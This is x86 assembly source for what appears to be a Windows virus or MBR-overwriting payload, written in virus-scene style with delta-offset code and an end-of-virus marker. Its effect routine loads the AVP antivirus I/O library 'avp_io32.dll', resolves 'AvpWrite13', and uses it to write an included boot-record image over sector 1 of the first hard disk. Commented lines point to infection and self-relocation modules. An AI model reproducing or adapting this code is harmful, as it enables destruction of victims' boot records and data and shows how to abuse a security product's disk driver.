
include                 doc\windows.inc

                        .386
                        .model  flat
                        locals  @@
                        jumps

                        .code

                        org     0000h

start:
                        ;int 3   ; debug entrypoint
                        NOP

                        call    $+5
                        pop     ebp
                        sub     ebp, offset $-1
;
;                        lea     esi, sux[ebp]
;sux:                    nop
;
;                        mov     ecx, virtsize/4
;@@1:                    push    ecx
;                        loop    @@1
;
;                        lea     esi, start[ebp]
;                        mov     edi, esp
;                        lea     eax, entry-start[edi]
;                        mov     cx, virtsize
;                        cld
;                        rep     movsb
;
;                        lea     ebp, [esp - 401000H]
;                        jmp     eax

entry:                  ;call    makedata
                        call    analizekernel

                        call    effect

                        jmp     exit_to_mustdie

effect:                 lea     eax, libname[ebp]
                        push    eax
                        call    _loadlibrarya

                        lea     ecx, writename[ebp]
                        push    ecx
                        push    eax

                        lea     ecx, readname[ebp]
                        push    ecx
                        push    eax

                        call    _getprocaddress
                        mov     avpread13_offs[ebp], eax

                        call    _getprocaddress
                        mov     avpwrite13_offs[ebp], eax

                       ; int 3

                       ; lea     eax, buf[ebp]
                       ; push    eax
                       ; push    1               ; sectcount
                       ; push    0               ; DH
                       ; push    1               ; CX
                       ; push    80h             ; DL
                       ; call    avpread13_offs[ebp]

                       ; lea     eax, buf[ebp]
                       ; not     byte ptr [eax] + 111h

                       ; lea     eax, buf[ebp]
                        lea     eax, mbr[ebp]
                        push    eax
                        push    1               ; sectcount
                        push    0               ; DH
                        push    1               ; CX
                        push    80h             ; DL
                        call    avpwrite13_offs[ebp]

                        ret

libname                 db      'avp_io32.dll',0
readname                db      'AvpRead13',0
writename               db      'AvpWrite13',0
avpread13_offs          dd      ?
avpwrite13_offs         dd      ?

;include                 zmakedat.inc
include                 zsystem.inc
;include                 zfile.inc
; nclude                 zinfect.inc

mbr:
include                 mbr.inc

include                 zdata.inc

;maxbufsize              equ     512
;buf                     db      maxbufsize dup ('?')

                        db      'EOV'

;virtsize                equ     ($-start+15) and (not 15)

                        end     start

